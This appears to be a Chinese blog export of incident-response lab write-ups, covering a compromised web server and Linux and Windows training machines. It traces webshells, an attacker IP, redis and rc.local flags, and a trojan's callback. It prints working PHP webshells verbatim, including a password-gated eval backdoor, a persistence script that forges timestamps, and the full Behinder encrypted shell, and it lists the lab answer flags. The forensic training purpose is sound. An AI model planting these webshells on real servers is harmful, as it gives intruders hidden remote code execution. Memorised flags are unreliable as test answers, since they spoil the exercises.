<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"pass"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string double-quoted-string">"5d41402abc4b2a76b9719d911017c592"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre>
<p>第一个就有，拿去解密一下<br><img src="https://ooo.0x0.ooo/2024/06/13/OJu7Yc.png" alt="OJu7Yc.png" loading="lazy"><br>密码<code>hello</code><br><strong>flag{hello}</strong><br>不是我提交之后发现这是第二题flag<br><img src="https://ooo.0x0.ooo/2024/06/13/OJue5r.png" alt="OJue5r.png" loading="lazy"><br>原来这是不死马的密码。<br>再看扫出来那几个其他的马吧</p>
<pre class="language-php" data-language="php"><code class="language-php">//1.php
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre>
<p>这么简单的一句话木马，应该就是这个了，连接密码是1<br><strong>flag{1}</strong></p>
<h2 id="服务器疑似存在不死马，请找到不死马的密码提交"><a href="#服务器疑似存在不死马，请找到不死马的密码提交" class="headerlink" title="服务器疑似存在不死马，请找到不死马的密码提交"></a>服务器疑似存在不死马，请找到不死马的密码提交</h2><p><strong>flag{hello}</strong><br>第一问不小心把第二问做了，看来经过md5可以绕过一些检测</p>
<h2 id="不死马是通过哪个文件生成的，请提交文件名"><a href="#不死马是通过哪个文件生成的，请提交文件名" class="headerlink" title="不死马是通过哪个文件生成的，请提交文件名"></a>不死马是通过哪个文件生成的，请提交文件名</h2><p>再看扫出来的哪几个东东，发现index.php有不死马的生成逻辑</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token constant">SYS_ROOT</span><span class="token operator">.</span><span class="token constant">INC</span><span class="token operator">.</span><span class="token string single-quoted-string">'common.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$path</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PATH_INFO'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token operator">?</span><span class="token string single-quoted-string">'?'</span><span class="token operator">.</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token variable">$path</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$path</span> <span class="token operator">=</span> <span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">safeword</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$ctrl</span><span class="token operator">=</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'run'</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'createprocess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token class-name static-context">Index</span><span class="token operator">::</span><span class="token function">createhtml</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cat'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'single'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
	<span class="token class-name static-context">Index</span><span class="token operator">::</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/.shell.php'</span><span class="token punctuation">;</span>
<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php if(md5($_POST["pass"])=="5d41402abc4b2a76b9719d911017c592")&#123;@eval($_POST[cmd]);&#125;?>'</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'touch -m -d "2021-01-01 00:00:01" .shell.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>
<p>使用<code>file_put_contents</code>写入并伪造了时间戳<br><strong>flag{index.php}</strong></p>
<h2 id="黑客留下了木马文件，请找出黑客的服务器ip提交"><a href="#黑客留下了木马文件，请找出黑客的服务器ip提交" class="headerlink" title="黑客留下了木马文件，请找出黑客的服务器ip提交"></a>黑客留下了木马文件，请找出黑客的服务器ip提交</h2><p>那就找一下1.php是哪个ip写入的，去看apache的access日志</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-3:/var/log/apache2<span class="token comment"># cat access.log.1 |grep '1.php' | awk '&#123;print $1&#125;' | sort | uniq</span>
<span class="token number">192.168</span>.200.2</code></pre>
<p>提交，错误！<br>发现另一个马也是这个ip，所以我猜不是通过web写入的<br>看了一下web目录发现一个可执行文件<code>&#39;shell(1).elf&#39;</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-3:/var/www/html<span class="token comment"># ls -al</span>
total <span class="token number">736</span>
drwxrwxrwx <span class="token number">8</span> www-data www-data   <span class="token number">4096</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">3</span> root     root       <span class="token number">4096</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  <span class="token punctuation">..</span>
<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> www-data www-data     <span class="token number">24</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  <span class="token number">1</span>.php
-rw-r--r-- <span class="token number">1</span> root     root     <span class="token number">655360</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  <span class="token number">1</span>.tar
drwxrwxrwx <span class="token number">3</span> www-data www-data   <span class="token number">4096</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  admin
<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> www-data www-data    <span class="token number">280</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  api.php
<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> www-data www-data    <span class="token number">882</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  config.php
drwxrwxrwx <span class="token number">3</span> www-data www-data   <span class="token number">4096</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  data
<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> www-data www-data    <span class="token number">894</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  favicon.ico
<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> www-data www-data    <span class="token number">142</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  .htaccess
drwxrwxrwx <span class="token number">4</span> www-data www-data   <span class="token number">4096</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  include
<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> root     root        <span class="token number">722</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  index.php
<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> www-data www-data  <span class="token number">12744</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  install.php
<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> www-data www-data   <span class="token number">1080</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  LICENSE
drwxrwxrwx <span class="token number">2</span> www-data www-data   <span class="token number">4096</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  pictures
<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> www-data www-data   <span class="token number">2235</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  README.md
<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> www-data www-data   <span class="token number">1049</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  rss.php
-rw-r--r-- <span class="token number">1</span> www-data www-data    <span class="token number">207</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span> <span class="token string">'shell(1).elf'</span>
-rw-r--r-- <span class="token number">1</span> www-data www-data     <span class="token number">88</span> Jan  <span class="token number">1</span>  <span class="token number">2021</span>  .shell.php
<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> www-data www-data    <span class="token number">566</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  sitemap.php
drwxrwxrwx <span class="token number">3</span> www-data www-data   <span class="token number">4096</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  template
drwxrwxrwx <span class="token number">3</span> www-data www-data   <span class="token number">4096</span> Aug  <span class="token number">3</span>  <span class="token number">2023</span>  wap</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-3:/var/www/html<span class="token comment"># file 'shell(1).elf'</span>
shell<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>.elf: ELF <span class="token number">32</span>-bit LSB executable, Intel <span class="token number">80386</span>, version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, statically linked, no section header</code></pre>
<p>看到elf习惯性的反编译一下看看有没有东西，因为不敢执行<br><img src="https://ooo.0x0.ooo/2024/06/13/OJuASG.png" alt="OJuASG.png" loading="lazy"><br>好像并没有东西，那就只能执行以下看看外连情况</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">
root@ip-10-0-10-3:/var/www/html<span class="token comment"># ./'shell(1).elf' &amp;</span>
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token number">1257</span>
root@ip-10-0-10-3:/var/www/html<span class="token comment"># netstat -talnp</span>
Active Internet connections <span class="token punctuation">(</span>servers and established<span class="token punctuation">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">127.0</span>.0.1:3306          <span class="token number">0.0</span>.0.0:*               LISTEN      <span class="token number">553</span>/mysqld
tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:22              <span class="token number">0.0</span>.0.0:*               LISTEN      <span class="token number">507</span>/sshd
tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">10.0</span>.10.3:22            <span class="token number">120.193</span>.78.19:3087      ESTABLISHED <span class="token number">843</span>/sshd: root@nott
tcp        <span class="token number">0</span>      <span class="token number">1</span> <span class="token number">10.0</span>.10.3:53880         <span class="token number">10.11</span>.55.21:3333        SYN_SENT    <span class="token number">1257</span>/./shell<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>.elf
tcp        <span class="token number">0</span>    <span class="token number">240</span> <span class="token number">10.0</span>.10.3:22            <span class="token number">120.193</span>.78.19:65018     ESTABLISHED <span class="token number">831</span>/sshd: root@pts/
tcp6       <span class="token number">0</span>      <span class="token number">0</span> :::80                   :::*                    LISTEN      <span class="token number">520</span>/apache2
tcp6       <span class="token number">0</span>      <span class="token number">0</span> :::22     </code></pre>
<p>发现<code>shell(1).elf</code>外连 10.11.55.21:3333<br><strong>flag{10.11.55.21}</strong></p>
<h2 id="黑客留下了木马文件，请找出黑客服务器开启的监端口提交"><a href="#黑客留下了木马文件，请找出黑客服务器开启的监端口提交" class="headerlink" title="黑客留下了木马文件，请找出黑客服务器开启的监端口提交"></a>黑客留下了木马文件，请找出黑客服务器开启的监端口提交</h2><p>由上一问得到端口是3333<br><strong>flag{3333}</strong></p>
]]></content>
      <categories>
        <category>玄机应急靶场</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>应急响应靶场(1)</title>
    <url>/posts/e0ad1852/</url>
    <content><![CDATA[<h1 id="靶场一-linux应急响应"><a href="#靶场一-linux应急响应" class="headerlink" title="靶场一 linux应急响应"></a>靶场一 linux应急响应</h1><blockquote>
<p>目标: 3个flag以及黑恶的ip地址<br>登录密码 defend</p>
</blockquote>
<h3 id="历史指令"><a href="#历史指令" class="headerlink" title="历史指令"></a>历史指令</h3><p>先登录root看历史指令<br><img src="https://ooo.0x0.ooo/2024/04/17/Omu08v.png" alt="Omu08v.png" loading="lazy"><br>拿到flag1 <code>flag&#123;thisismybaby&#125;</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost defend<span class="token punctuation">]</span><span class="token comment"># history</span>
    <span class="token number">1</span>  <span class="token function">ls</span>
    <span class="token number">2</span>  <span class="token function">chmod</span> +x /etc/rc.d/rc.local
    <span class="token number">3</span>  <span class="token function">cat</span> /etc/rc.d/rc.local
    <span class="token number">4</span>  <span class="token function">vim</span> /etc/rc.d/rc.local 
    <span class="token number">5</span>  <span class="token builtin class-name">echo</span> flag<span class="token punctuation">&#123;</span>thisismybaby<span class="token punctuation">&#125;</span>
    <span class="token number">6</span>  <span class="token builtin class-name">exit</span>
    <span class="token number">7</span>  <span class="token function">ls</span> 
    <span class="token number">8</span>  <span class="token function">ls</span> <span class="token parameter variable">-al</span>
    <span class="token number">9</span>  <span class="token function">cat</span> .bash_history 
   <span class="token number">10</span>  <span class="token function">history</span></code></pre>
<p>根据历史指令 黑客修改了&#x2F;etc&#x2F;rc.d&#x2F;rc.local 文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost etc<span class="token punctuation">]</span><span class="token comment"># cat /etc/rc.d/rc.local</span>
<span class="token comment">#!/bin/bash</span>
<span class="token comment"># THIS FILE IS ADDED FOR COMPATIBILITY PURPOSES</span>
<span class="token comment">#</span>
<span class="token comment"># It is highly advisable to create own systemd services or udev rules</span>
<span class="token comment"># to run scripts during boot instead of using this file.</span>
<span class="token comment">#</span>
<span class="token comment"># In contrast to previous versions due to parallel execution during boot</span>
<span class="token comment"># this script will NOT be run after all other services.</span>
<span class="token comment">#</span>
<span class="token comment"># Please note that you must run 'chmod +x /etc/rc.d/rc.local' to ensure</span>
<span class="token comment"># that this script will be executed during boot.</span>


<span class="token comment"># flag&#123;kfcvme50&#125;</span></code></pre>
<p>文件里面放了第二个flag<br><code>flag&#123;kfcvme50&#125;</code><br>文件里还有信息<code>touch /var/lock/subsys/local</code><br>创建了一个local文件但是目录是空</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost subsys<span class="token punctuation">]</span><span class="token comment"># ls -al</span>
总用量 <span class="token number">0</span>
drwxr-xr-x. <span class="token number">2</span> root root  <span class="token number">80</span> <span class="token number">4</span>月  <span class="token number">17</span> <span class="token number">17</span>:12 <span class="token builtin class-name">.</span>
drwxr-xr-x. <span class="token number">8</span> root root <span class="token number">220</span> <span class="token number">4</span>月  <span class="token number">17</span> <span class="token number">17</span>:12 <span class="token punctuation">..</span>
-rw-r--r--. <span class="token number">1</span> root root   <span class="token number">0</span> <span class="token number">4</span>月  <span class="token number">17</span> <span class="token number">17</span>:12 <span class="token builtin class-name">local</span>
-rw-r--r--. <span class="token number">1</span> root root   <span class="token number">0</span> <span class="token number">4</span>月  <span class="token number">17</span> <span class="token number">1</span></code></pre>
<p>第三个flag在redis的配置目录下找到<br>其实是偷鸡找到的,但是也说明了redis配置文件容易被入侵</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost etc<span class="token punctuation">]</span><span class="token comment"># grep -rl "flag&#123;" .</span>
./rc.d/rc.local
./redis.conf</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost subsys<span class="token punctuation">]</span><span class="token comment"># cat /etc/redis.conf</span>
<span class="token comment"># flag&#123;P@ssW0rd_redis&#125;</span>
<span class="token comment"># Redis configuration file example.</span>
<span class="token comment">#</span>
<span class="token comment"># Note that in order to read the configuration file, Redis must be</span>
<span class="token comment"># started with the file path as first argument:</span>
<span class="token comment">#</span>
<span class="token comment"># ./redis-server /path/to/redis.conf</span>

<span class="token comment"># Note on units: when memory size is needed, it is possible to specify</span>
<span class="token comment"># it in the usual form of 1k 5GB 4M and so forth:</span>
<span class="token comment">#</span>
<span class="token comment"># 1k => 1000 bytes</span>
<span class="token comment"># 1kb => 1024 bytes</span>
<span class="token comment"># 1m => 1000000 bytes</span>
<span class="token comment"># 1mb => 1024*1024 bytes</span>
<span class="token comment"># 1g => 1000000000 bytes</span>
<span class="token comment"># 1gb => 1024*1024*1024 bytes</span>
<span class="token comment">#</span>
<span class="token comment"># units are case insensitive so 1GB 1Gb 1gB are all the same.</span></code></pre>
<p>第三个flag <code>&#123;P@ssW0rd_redis&#125;</code></p>
<h3 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h3><p>最后是找到黑客的ip，从redis被入侵来看redis日志极可能包含ip</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost redis<span class="token punctuation">]</span><span class="token comment"># cat redis.log |grep Acc</span>
<span class="token number">11111</span>:M <span class="token number">18</span> Mar <span class="token number">19</span>:27:54.895 - Accepted <span class="token number">127.0</span>.0.1:41590
<span class="token number">11595</span>:M <span class="token number">18</span> Mar <span class="token number">19</span>:27:57.321 - Accepted <span class="token number">192.168</span>.75.129:54766
<span class="token number">11595</span>:M <span class="token number">18</span> Mar <span class="token number">19</span>:39:31.996 - Accepted <span class="token number">192.168</span>.75.129:53104
<span class="token number">11595</span>:M <span class="token number">18</span> Mar <span class="token number">19</span>:39:34.052 - Accepted <span class="token number">192.168</span>.75.129:57672
<span class="token number">11595</span>:M <span class="token number">18</span> Mar <span class="token number">19</span>:44:53.399 - Accepted <span class="token number">127.0</span>.0.1:41594
<span class="token number">12234</span>:M <span class="token number">18</span> Mar <span class="token number">19</span>:47:02.153 - Accepted <span class="token number">192.168</span>.75.129:45240
<span class="token number">12234</span>:M <span class="token number">18</span> Mar <span class="token number">19</span>:47:03.612 - Accepted <span class="token number">192.168</span>.75.129:53124
<span class="token number">12234</span>:M <span class="token number">18</span> Mar <span class="token number">19</span>:53:40.994 - Accepted <span class="token number">127.0</span>.0.1:41596
<span class="token number">12559</span>:M <span class="token number">18</span> Mar <span class="token number">19</span>:53:45.397 - Accepted <span class="token number">192.168</span>.75.129:44572
<span class="token number">12559</span>:M <span class="token number">18</span> Mar <span class="token number">19</span>:53:46.807 - Accepted <span class="token number">192.168</span>.75.129:44582
<span class="token number">12559</span>:M <span class="token number">18</span> Mar <span class="token number">20</span>:20:57.221 - Accepted <span class="token number">127.0</span>.0.1:41598
<span class="token number">13274</span>:M <span class="token number">18</span> Mar <span class="token number">20</span>:21:56.411 - Accepted <span class="token number">192.168</span>.75.129:54826
<span class="token number">13274</span>:M <span class="token number">18</span> Mar <span class="token number">20</span>:21:58.333 - Accepted <span class="token number">192.168</span>.75.129:54836</code></pre>
<p>根据进入的ip锁定黑客ip为192.168.75.129<br>上交题解系统</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>defend@localhost 题解<span class="token punctuation">]</span>$ ./题解Script.sh
欢迎使用 知攻善防实验室 解题系统
在继续之前，您需要获得以下内容：
<span class="token number">1</span>.攻击者IP地址
<span class="token number">2</span>.三个flag<span class="token punctuation">(</span>flag格式flag<span class="token punctuation">&#123;</span>xxxxx<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
您准备好了吗？<span class="token punctuation">(</span>y/n<span class="token punctuation">)</span> y
请输入攻击者的IP地址：192.168.75.129  
您输入的IP地址正确，请继续
请输入第一个flag：flag<span class="token punctuation">&#123;</span>thisismybaby<span class="token punctuation">&#125;</span>
您输入的第一个flag正确，请继续
请输入第二个flag：flag<span class="token punctuation">&#123;</span>kfcvme50<span class="token punctuation">&#125;</span>
您输入的第二个flag正确，请继续
请输入第三个flag：flag<span class="token punctuation">&#123;</span>P@ssW0rd_redis<span class="token punctuation">&#125;</span>
您输入的第三个flag正确，请继续
恭喜您，成功攻克该靶机！
恭喜您，成功攻克该靶机！
恭喜您，成功攻克该靶机！
恭喜您，成功攻克该靶机！
恭喜您，成功攻克该靶机！
恭喜您，成功攻克该靶机！</code></pre>

<h1 id="靶场二-windows"><a href="#靶场二-windows" class="headerlink" title="靶场二 windows"></a>靶场二 windows</h1><p>是一个windows靶机<br><img src="https://ooo.0x0.ooo/2024/04/17/OmujwI.png" alt="OmujwI.png" loading="lazy"><br>先看一下需要哪些flag<br><img src="https://ooo.0x0.ooo/2024/04/17/OmIAPq.png" alt="OmIAPq.png" loading="lazy"></p>
<blockquote>
<p>公众号：知攻善防实验室<br>欢迎使用知攻善防实验室-应急响应训练靶机解题系统<br>在此之前，您应该获取到以下信息<br>1.攻击者的shell密码<br>2.攻击者的IP地址<br>3.攻击者的隐藏账户名称<br>4.攻击者挖矿程序的矿池域名</p>
</blockquote>
<p>桌面有个phpstudy<br>进入web目录用d盾扫描一下<br><img src="https://ooo.0x0.ooo/2024/04/17/Omu8HF.png" alt="Omu8HF.png" loading="lazy"><br>扫到一个后门<br><img src="https://ooo.0x0.ooo/2024/04/17/Omu3Jb.png" alt="Omu3Jb.png" loading="lazy"><br><code>C:\phpstudy_pro\WWW\content\plugins\tips\shell.php</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$key</span><span class="token operator">=</span><span class="token string double-quoted-string">"e45e329feb5d925b"</span><span class="token punctuation">;</span> <span class="token comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span>
	<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'k'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$key</span><span class="token punctuation">;</span>
	<span class="token function">session_write_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$post</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'openssl'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		<span class="token variable">$t</span><span class="token operator">=</span><span class="token string double-quoted-string">"base64_"</span><span class="token operator">.</span><span class="token string double-quoted-string">"decode"</span><span class="token punctuation">;</span>
		<span class="token variable">$post</span><span class="token operator">=</span><span class="token variable">$t</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		
		<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    			 <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$key</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
    			<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span>
	<span class="token punctuation">&#123;</span>
		<span class="token variable">$post</span><span class="token operator">=</span><span class="token function">openssl_decrypt</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"AES128"</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
    <span class="token variable">$arr</span><span class="token operator">=</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$params</span><span class="token operator">=</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
    @<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>
